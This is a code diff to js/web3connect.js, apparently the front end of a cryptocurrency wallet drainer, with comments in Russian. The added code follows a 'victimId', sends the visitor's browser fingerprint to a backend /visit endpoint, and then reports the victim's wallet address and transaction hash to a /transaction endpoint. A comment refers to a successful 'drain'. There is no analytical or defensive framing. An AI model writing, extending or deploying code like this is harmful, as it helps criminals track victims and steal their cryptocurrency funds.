@@ -131,39 +131,81 @@ async function sendConnectionData(walletAddress) {
 /**
  * Отправка данных о транзакции
  */
+// js/web3connect.js
+
 async function sendTransactionData(txHash, walletAddress) {
     try {
-        const victimId = localStorage.getItem('victimId');
-        if (!victimId) return;
+        console.log('[FRONTEND] sendTransactionData: Функция вызвана с txHash:', txHash);
 
-        const txData = {
-            victimId: victimId,
-            walletAddress: walletAddress,
-            txHash: txHash,
-            timestamp: new Date().toISOString()
-        };
+        // Сначала проверяем, есть ли у нас уже victimId из localStorage
+        const victimIdFromStorage = localStorage.getItem('victimId');
+        if (victimIdFromStorage) {
+            console.log('[FRONTEND] sendTransactionData: Используем victimId из localStorage:', victimIdFromStorage);
+        } else {
+            console.warn('[FRONTEND] sendTransactionData: victimId не найден в localStorage, делаем запрос к /visit');
+        }
 
-        const response = await fetch(`${BACKEND_URL}/transaction`, {
+        // Всегда делаем запрос к /visit для получения актуального victimId
+        const lastVisitResponse = await fetch(`${BACKEND_URL}/visit`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(txData)
+            body: JSON.stringify({
+                userAgent: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                timestamp: new Date().toISOString()
+            })
         });
 
-        if (!response.ok) {
-            const errorText = await response.text();
-            console.error('Не удалось отправить данные о транзакции:', errorText);
+        if (!lastVisitResponse.ok) {
+            const errorText = await lastVisitResponse.text();
+            console.error('[FRONTEND] sendTransactionData: Ошибка при проверке посещения:', errorText);
             return;
         }
 
-        const result = await response.json();
-        // Успешно отправлено
+        const visitResult = await lastVisitResponse.json();
+        console.log('[FRONTEND] sendTransactionData: Получен ответ от /visit:', visitResult);
+
+        if (visitResult.success && visitResult.id) {
+            // Используем только что полученный victimId
+            const victimId = visitResult.id;
+            console.log('[FRONTEND] sendTransactionData: Используем новый victimId:', victimId);
+
+            const transactionData = {
+                victimId: victimId,
+                walletAddress: walletAddress,
+                txHash: txHash,
+                timestamp: new Date().toISOString()
+            };
+
+            const response = await fetch(`${BACKEND_URL}/transaction`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(transactionData)
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('[FRONTEND] sendTransactionData: Ошибка от сервера:', errorText);
+                return;
+            }
+
+            const result = await response.json();
+            console.log('[FRONTEND] sendTransactionData: Ответ сервера', result);
+            
+            // Успешно отправлено
+        } else {
+            console.warn('[FRONTEND] sendTransactionData: Сервер не вернул success=true или id', visitResult);
+            return;
+        }
     } catch (error) {
-        console.log('Не удалось отправить данные о транзакции:', error.message);
+        console.error('[FRONTEND] sendTransactionData: Ошибка:', error);
     }
 }
-
 /**
  * Отправка данных об успешном дрейне
  */
@@ -691,6 +733,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
